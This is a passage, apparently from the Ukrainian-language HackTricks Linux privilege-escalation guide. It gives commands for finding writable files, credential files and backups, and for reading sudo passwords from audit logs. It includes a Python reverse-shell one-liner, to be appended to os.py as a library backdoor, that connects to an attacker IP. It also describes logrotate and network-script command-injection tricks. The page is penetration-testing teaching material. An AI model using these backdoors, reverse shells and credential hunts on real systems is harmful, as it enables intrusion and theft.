find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це програма з відкритим кодом, яка використовується для отримання великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Логи

Якщо ви можете читати логи, ви можете знайти **цікаву/конфіденційну інформацію всередині них**. Чим дивніший лог, тим цікавішим він буде (ймовірно).\
Також деякі **bad** налаштовані (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередині audit logs, як пояснено в цьому дописі: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати логи**, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Загальний пошук Creds/Regex

Вам також слід перевірити файли, які містять слово "**password**" у своїй **назві** або всередині **вмісту**, а також перевірити IPs і електронні адреси в логах або hashes regexps.\
Я не збираюся тут перераховувати, як робити все це, але якщо вам цікаво, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли з правами запису

### Python library hijacking

Якщо ви знаєте **звідки** буде виконано python script і ви **можете записувати в** ту папку або ви **можете модифікувати python libraries**, ви можете змінити бібліотеку OS і backdoor її (якщо ви можете записувати там, де буде виконано python script, скопіюйте і вставте бібліотеку os.py).

Щоб **backdoor the library** просто додайте в кінці бібліотеки os.py наступний рядок (змініть IP і PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація logrotate

Уразливість у `logrotate` дозволяє користувачам з **правами запису** у файл журналу або у його батьківські директорії потенційно отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто працює від імені **root**, можна змусити виконувати довільні файли, особливо в директоріях на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не тільки в _/var/log_, а й у будь-яких директоріях, де застосовується ротація логів.

> [!TIP]
> Ця уразливість стосується версій `logrotate` `3.18.0` та старіших

Детальнішу інформацію про уразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю уразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви виявляєте, що можете змінювати логи, перевірте, хто ними керує, і чи можна підвищити привілеї, замінивши логи на symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** скрипт `ifcf-<whatever>` до _/etc/sysconfig/network-scripts_ **або** може **відредагувати** існуючий, то ваша система pwned.

Network scripts, _ifcg-eth0_ for example are used for network connections. Вони виглядають точно як .INI файли. Проте вони \~sourced\~ на Linux by Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих мережевих скриптах обробляється неправильно. Якщо у вас є **white/blank space in the name the system tries to execute the part after the white/blank space**. Це означає, що **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network і /bin/id_)

### **init, init.d, systemd, та rc.d**

Директорія `/etc/init.d` містить **scripts** для System V init (SysVinit) — **класичну систему управління сервісами Linux**. Тут є скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Їх можна запускати напряму або через символічні посилання у `/etc/rc?.d/`. Альтернативний шлях у Redhat-системах — `/etc/rc.d/init.d`.

Натомість `/etc/init` пов’язана з **Upstart**, новішою системою **service management**, запровадженою Ubuntu, де для керування сервісами використовуються конфігураційні файли. Незважаючи на перехід до Upstart, SysVinit-скрипти все ще використовуються разом із конфігураціями Upstart через суміснісний шар в Upstart.

**systemd** з’являється як сучасний ініціалізатор та менеджер сервісів, що пропонує розширені можливості, такі як on-demand запуск демонів, управління automount та знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутиву та `/etc/systemd/system/` для змін адміністратора, спрощуючи адміністрування системи.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай підмінюють syscall, щоб надати менеджеру в userspace привілейований доступ до функціональності ядра. Слабка автентифікація менеджера (наприклад, перевірки підпису, що базуються на FD-order, або погані схеми паролів) може дозволити локальному app видавати себе за менеджера і escalate to root на вже rooted-пристроях. Детальніше та техніки експлуатації дивіться тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery в VMware Tools/Aria Operations може витягнути шлях до бінарника з рядків команд процесів і виконати його з -v у привілейованому контексті. Допустимі патерни (наприклад, використання \S) можуть співпасти з розміщеними зловмисником listener-ами в записуваних локаціях (наприклад, /tmp/httpd), що призводить до виконання як root (CWE-426 Untrusted Search Path).

Детальніше і узагальнений патерн, застосовний до інших discovery/monitoring стеків, дивіться тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
